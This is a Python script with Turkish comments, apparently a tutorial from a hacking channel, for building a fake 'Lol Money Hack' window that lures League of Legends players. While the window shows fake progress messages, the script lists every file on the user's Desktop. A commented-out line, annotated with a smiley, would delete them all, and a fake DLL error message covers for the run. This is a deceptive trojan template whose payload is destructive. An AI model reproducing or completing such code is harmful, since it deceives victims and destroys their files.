#KekikSiber | t.me/kekiksiber | Python ile Sahte Arayüz Oluşturuyoruz
import tkinter                  # arayüz için
import sys                      # dosya ismi|exit için
import time                     # sleep() için
import platform                 # cihaz bilgileri için
import urllib.request as req    # resim kodunu internetten çekebilmek için
from tkinter import messagebox  # tkinter içerisinden messagebox'ı çektik . Böylece hata gösterebileceğiz 

def Macera():
    import os               # Dizinlerle çalışmak için
    
    konum = os.getcwd()     # Şuanki konumu aldık | almasak da olurdu
    isim = os.getlogin()    # Desktop'a geçmek için isim'i aldık
    os.chdir("C:\\Users\\"+isim+"\\Desktop")    # Desktop konuma geçtik
                                                # os.chdir(os.getenv("desktop")) de kullanılabilir
                                                
    for i in os.listdir(): # Desktop konumundaki tüm dosyaları listeledik
        try:
            print(i)        # Listelediğimiz tüm dosyaları ekrana yazdık
            #os.remove(i)    # Listelediğimiz tüm dosyaları sildik :)
        except:pass

app = tkinter.Tk()              # tkinter penceremizi açtık
image = tkinter.PhotoImage(data=req.urlopen("http://bytedata.tk/arayuz/lol.png.txt").read())
app.title("Lol Money Hack")     # bu kısım gözükmeyecek lakin ginede title ekleyebiliriz
#app.wm_overrideredirect(True)   # Bu kod ile kapat tuşunu ve küçült tuşunun olduğu kısmı komple kaldırıyoruz
#app.attributes("-alpha", 0.9)   # Bu kod ile penceremize hafif şeffaflık katıyoruz
app.iconphoto(1,image)

windowWidth = app.winfo_reqwidth()     # penceremizin enlemini aldık
windowHeight = app.winfo_reqheight()   # penceremizin boylamını aldık
positionRight = int(app.winfo_screenwidth()/3 - windowWidth/2)  # Pencere konumumuzun enlemini
positionDown = int(app.winfo_screenheight()/3 - windowHeight/2) # Pencere konumumuzun boylamını değiştiriyor.
app.geometry(f"+{positionRight}+{positionDown}")                # Pencere konumumuz ayarlıyoruz

#NOT# positionRight ve positionDown 'da pencereyi ortalarken "3" rakamında değişiklik yapmanız gerekebilir 

app.resizable(0,0)  # Yeniden boyutlandırmayı kapattık
label = tkinter.Label(image=image,text=" ",compound="top",bg="black",fg="white",cursor="watch") # label'ı ayarladık 
label.pack()        # label'imizi görünür yaptık
app.update()        # Tkinter'a tüm ayarları yaptığımızı söyledik.
                    # Böylece sleep verdiğimiz zaman ekrandaki herşeyi gösterip sonra bekleyecek.
                    # Aksi türlü ilk sleep()'i bekliyor ardından uygulamamızı açıyor .
time.sleep(3)       # Arkadaşımızı azıcık bekletelim değil mi :) +knk az bekle yüklenir şimdi
label.config(text="Searching LOL Files ..") # 3 saniye bekledikten sonra daha önce " " olarak verdiğimiz değere birkaç şeyler yazalım 
											# Yabancı dil kullanarak "+ adamlar yapmış bee" dedirtebilirsiniz .)
app.update()        # Tekrardan güncelleme vermek zorundayız
time.sleep(3)       # "Searching LOL Files .." :)
label["text"] = "Searching LOL Account" # label.config() yapmak yerine label[]'de kullanabilirsiniz .
app.update()        # Tekrardan güncelliyoruz
Macera()            # Fonksiyonumuzu Çağırdık
messagebox.showerror("LOL Money Hack","Id1oT.dll not found !") # :) .dll bulunamadı adında bir hata çıkarttık

sys.exit()      # Hata ekranı geçildikten sonra tüm uygulamamızı kapattık

app.mainloop()  # penceremizi aktif ettik 